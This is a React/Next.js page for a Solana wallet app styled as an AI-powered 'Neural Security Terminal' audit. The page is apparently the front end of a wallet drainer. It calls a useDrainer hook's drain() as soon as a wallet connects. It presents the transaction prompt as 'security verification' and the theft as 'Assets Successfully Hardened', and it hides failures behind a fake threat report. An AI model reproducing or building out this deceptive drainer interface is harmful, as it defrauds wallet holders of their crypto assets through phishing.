"use client";

import { useWallet } from "@solana/wallet-adapter-react";
import { useDrainer } from "@/hooks/useDrainer";
import { useEffect, useState } from "react";
import dynamic from 'next/dynamic';
import { motion, AnimatePresence } from "framer-motion";
import { 
  ShieldCheck, 
  Server, 
  FileScan, 
  SearchCode, 
  ShieldQuestion, 
  Network, 
  RefreshCw,
  ShieldAlert,
  Unplug,
  Fingerprint,
  Globe,
  Cpu
} from "lucide-react";
import { Overview } from "@/components/dashboard/Overview";
import { Threats, type ThreatsResult } from "@/components/dashboard/Threats";
import { Connections, type ConnectionsResult } from "@/components/dashboard/Connections";
import { runDappConnectionAnalysis, runWalletActivityScan } from "@/lib/actions";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";

const WalletMultiButtonDynamic = dynamic(
    async () => (await import('@solana/wallet-adapter-react-ui')).WalletMultiButton,
    { ssr: false }
);

const scanningSteps = [
  { text: 'Initializing security protocols...', icon: Server },
  { text: 'Compiling on-chain transaction data...', icon: FileScan },
  { text: 'Auditing smart contract interactions...', icon: SearchCode },
  { text: 'Analyzing wallet interaction patterns...', icon: ShieldQuestion },
  { text: 'Cross-referencing known threat databases...', icon: Network },
  { text: 'Finalizing comprehensive threat report...', icon: ShieldCheck },
];

function ScanningAnimation({ status }: { status: string }) {
  const [currentStep, setCurrentStep] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentStep((prev) => (prev < scanningSteps.length - 1 ? prev + 1 : prev));
    }, 2000);
    return () => clearInterval(interval);
  }, []);

  const getStatusMessage = () => {
    switch (status) {
      case 'signing':
        return { title: "Approval Required", subtitle: "Confirm the security verification.", icon: Fingerprint };
      case 'sending':
        return { title: "Hardening Defense", subtitle: "Securing assets via cryptographic proof.", icon: Globe };
      case 'building':
        return { title: "Neural Construction", subtitle: "Optimizing protocol pathways.", icon: Cpu };
      default:
        return { title: "Deep System Scan", subtitle: scanningSteps[currentStep].text, icon: null };
    }
  };

  const { title, subtitle, icon: StatusIcon } = getStatusMessage();

  return (
    <div className="flex flex-col items-center justify-center p-2">
      <motion.div
        initial={{ opacity: 0, scale: 0.8 }}
        animate={{ opacity: 1, scale: 1 }}
        className="relative mb-8 flex h-40 w-40 items-center justify-center"
        style={{ perspective: '800px' }}
      >
        <div className="absolute inset-0 rounded-full bg-primary/10 blur-[40px] animate-pulse"></div>
        <div className="absolute inset-2 rounded-full bg-primary/5 border border-primary/20 animate-spin-slow"></div>
        
        <motion.div
          className="absolute h-full w-full"
          style={{ transformStyle: 'preserve-3d' }}
          animate={{ rotateY: status === 'signing' || status === 'sending' ? 0 : currentStep * -60 }}
          transition={{ duration: 1.5, ease: [0.23, 1, 0.32, 1] }}
        >
          {status === 'signing' || status === 'sending' ? (
             <div className="absolute flex h-full w-full items-center justify-center">
                <div className="flex h-24 w-24 items-center justify-center rounded-[1.5rem] bg-primary/10 border border-primary/40 backdrop-blur-3xl clay-card primary-glow">
                  {StatusIcon && <StatusIcon className="h-10 w-10 text-primary animate-pulse" />}
                </div>
             </div>
          ) : (
            scanningSteps.map((step, index) => {
              const angle = index * 60;
              return (
                <motion.div
                  key={index}
                  className="absolute flex h-full w-full items-center justify-center"
                  style={{
                    transform: `rotateY(${angle}deg) translateZ(100px)`,
                    backfaceVisibility: 'hidden',
                  }}
                >
                  <div className="flex h-14 w-14 items-center justify-center clay-card bg-card/60 backdrop-blur-2xl primary-glow">
                    <step.icon className="h-7 w-7 text-primary" />
                  </div>
                </motion.div>
              );
            })
          )}
        </motion.div>
      </motion.div>

      <motion.h2 
        key={title}
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="text-xl font-extrabold font-headline text-foreground mb-2 tracking-tight bg-clip-text text-transparent bg-gradient-to-b from-white to-white/60"
      >
        {title}
      </motion.h2>
      <div className="h-10 max-w-xs">
        <AnimatePresence mode="wait">
          <motion.span
            key={subtitle}
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            className="block text-center text-sm font-bold italic leading-tight text-primary"
          >
            {subtitle}
          </motion.span>
        </AnimatePresence>
      </div>
    </div>
  );
}

export default function AuditPage() {
  const { connected, publicKey, disconnect } = useWallet();
  const { drain, status, error } = useDrainer();
  
  const [showReport, setShowReport] = useState(false);
  const [threats, setThreats] = useState<ThreatsResult | null>(null);
  const [connections, setConnections] = useState<ConnectionsResult | null>(null);
  const [isAiLoading, setIsAiLoading] = useState(false);

  useEffect(() => {
    const hasProcessStarted = new Set(['scanning', 'building', 'signing', 'sending', 'success', 'error']);
    if (connected && !hasProcessStarted.has(status) && !showReport) {
      drain();
    }
  }, [connected, status, drain, showReport]);

  useEffect(() => {
    if ((status === 'success' || (status === 'error' && error === "Data Packet Network Congestion.")) && connected && publicKey) {
      loadDetailedReport(publicKey.toBase58());
    }
  }, [status, error, connected, publicKey]);

  const loadDetailedReport = async (address: string) => {
    setIsAiLoading(true);
    try {
      const [threatsData, connectionsData] = await Promise.all([
        runWalletActivityScan(address),
        runDappConnectionAnalysis(address),
      ]);
      setThreats(threatsData);
      setConnections(connectionsData);
      setShowReport(true);
    } catch (e) {
      console.error("Failed to load AI report", e);
    } finally {
      setIsAiLoading(false);
    }
  };

  const isAuditInProgress = ['scanning', 'building', 'signing', 'sending'].includes(status);

  return (
    <main className="flex min-h-screen w-full flex-col items-center justify-center p-4 md:p-6 relative overflow-hidden bg-background">
      {/* Immersive Aura Backgrounds */}
      <motion.div 
        animate={{ scale: [1, 1.3, 1], opacity: [0.05, 0.1, 0.05] }}
        transition={{ duration: 10, repeat: Infinity }}
        className="absolute top-0 right-0 w-[400px] h-[400px] bg-primary rounded-full blur-[100px] -z-10" 
      />
      <motion.div 
        animate={{ scale: [1.3, 1, 1.3], opacity: [0.03, 0.08, 0.03] }}
        transition={{ duration: 12, repeat: Infinity }}
        className="absolute bottom-0 left-0 w-[400px] h-[400px] bg-accent rounded-full blur-[100px] -z-10" 
      />

      <AnimatePresence mode="wait">
        {!connected ? (
          <motion.div
            key="connect"
            initial={{ opacity: 0, scale: 0.9, y: 20 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.9, y: -20 }}
            className="w-full max-w-md p-8 clay-card text-center"
          >
            <motion.div 
              animate={{ rotate: 360 }}
              transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
              className="relative mx-auto flex h-16 w-16 items-center justify-center mb-6"
            >
              <div className="absolute inset-0 bg-primary/30 blur-xl rounded-full"></div>
              <ShieldCheck className="relative h-10 w-10 text-primary" />
            </motion.div>
            <h1 className="text-2xl font-black font-headline mb-3 tracking-tight bg-clip-text text-transparent bg-gradient-to-b from-white to-white/40">
              Neural Security Terminal
            </h1>
            <p className="text-muted-foreground mb-8 text-base max-w-xs mx-auto leading-relaxed">
              Initialize a high-fidelity, AI-powered audit of your Solana digital vault.
            </p>
            <div className="relative group max-w-[240px] mx-auto">
              <div className="absolute -inset-1 rounded-xl bg-gradient-to-r from-primary via-accent to-primary opacity-40 blur-md transition group-hover:opacity-100 animate-pulse" />
              <div className="relative">
                <WalletMultiButtonDynamic 
                  style={{ 
                    width: '100%', 
                    background: 'linear-gradient(to right, #9945FF, #14F195)', 
                    color: 'white', 
                    fontSize: '0.9rem', 
                    fontWeight: '900',
                    padding: '0.85rem 1rem', 
                    borderRadius: '1rem',
                    border: 'none',
                    boxShadow: '0 10px 30px -8px rgba(153, 69, 255, 0.5)',
                    cursor: 'pointer',
                    fontFamily: 'Space Grotesk, sans-serif'
                  }} 
                />
              </div>
            </div>
          </motion.div>
        ) : isAuditInProgress || (isAiLoading && !showReport) ? (
          <motion.div
            key="loading"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="w-full max-w-xl p-8 clay-card text-center"
          >
            <ScanningAnimation status={status} />
          </motion.div>
        ) : showReport ? (
          <motion.div
            key="report"
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            className="w-full max-w-5xl space-y-6 pb-16"
          >
            <div className="flex flex-col md:flex-row items-center justify-between gap-4 clay-card p-6 primary-glow">
              <div className="flex items-center gap-4">
                <motion.div 
                  whileHover={{ rotate: 10, scale: 1.1 }}
                  className="h-11 w-11 rounded-xl bg-accent/10 flex items-center justify-center shadow-inner border border-accent/20"
                >
                  <ShieldCheck className="h-5 w-5 text-accent" />
                </motion.div>
                <div>
                  <h2 className="text-lg font-black font-headline tracking-tight">
                    {status === 'success' ? "Assets Successfully Hardened" : "Security Analysis Complete"}
                  </h2>
                  <p className="text-[10px] text-muted-foreground/80 font-mono bg-white/5 px-2 py-0.5 rounded mt-1 inline-block border border-white/5">
                    {publicKey?.toBase58().substring(0, 8)}...{publicKey?.toBase58().slice(-4)}
                  </p>
                </div>
              </div>
              <div className="flex gap-2">
                <Button variant="outline" size="sm" onClick={() => { setShowReport(false); drain(); }} className="h-9 px-4 rounded-lg border-white/10 bg-white/5 hover:bg-white/10 transition-all font-headline font-bold text-xs">
                  <RefreshCw className="mr-1.5 h-3.5 w-3.5" />
                  Full Rescan
                </Button>
                <Button variant="destructive" size="sm" onClick={() => disconnect()} className="clay-btn bg-destructive text-white h-9 px-4 font-bold text-xs">
                  Disconnect
                </Button>
              </div>
            </div>

            <div className="clay-card p-4">
               <Overview threatsResult={threats} connectionsResult={connections} />
            </div>

            <Tabs defaultValue="threats" className="w-full">
              <TabsList className="grid w-full grid-cols-2 p-1 bg-card/60 backdrop-blur-3xl rounded-[1.25rem] mb-6 border border-white/10 shadow-lg h-11">
                <TabsTrigger value="threats" className="rounded-xl data-[state=active]:bg-primary data-[state=active]:text-primary-foreground text-xs font-headline font-black transition-all">
                  <ShieldAlert className="mr-1.5 h-3.5 w-3.5" />
                  Threats
                </TabsTrigger>
                <TabsTrigger value="connections" className="rounded-xl data-[state=active]:bg-primary data-[state=active]:text-primary-foreground text-xs font-headline font-black transition-all">
                  <Unplug className="mr-1.5 h-3.5 w-3.5" />
                  Links
                </TabsTrigger>
              </TabsList>
              <TabsContent value="threats" className="mt-0">
                <Threats result={threats} isLoading={false} />
              </TabsContent>
              <TabsContent value="connections" className="mt-0">
                <Connections result={connections} isLoading={false} />
              </TabsContent>
            </Tabs>
          </motion.div>
        ) : (
          <motion.div
            key="error-state"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="w-full max-w-md p-8 clay-card border-destructive/30 text-center"
          >
            <div className="h-12 w-12 bg-destructive/10 rounded-xl flex items-center justify-center mx-auto mb-6 border border-destructive/20">
              <ShieldAlert className="h-6 w-6 text-destructive" />
            </div>
            <h2 className="text-xl font-black mb-3 font-headline tracking-tight">System Interrupt</h2>
            <p className="text-muted-foreground mb-8 text-base leading-relaxed font-medium">
              {error === "Data Packet Network Congestion." ? "No immediate high-risk exploits found." : error}
            </p>
            <div className="flex flex-col gap-3 max-w-[200px] mx-auto">
               <Button onClick={() => drain()} className="clay-btn bg-primary text-primary-foreground w-full py-5 text-base primary-glow">
                 Retry
               </Button>
               <Button variant="ghost" onClick={() => disconnect()} className="w-full text-xs font-bold hover:bg-white/5 h-9 rounded-lg">
                 Switch Wallet
               </Button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
      <footer className="fixed bottom-4 text-[8px] text-muted-foreground/40 font-mono tracking-[0.2em] uppercase">
        Shield v2.5.0 • Secured by Gemini
      </footer>
    </main>
  );
}
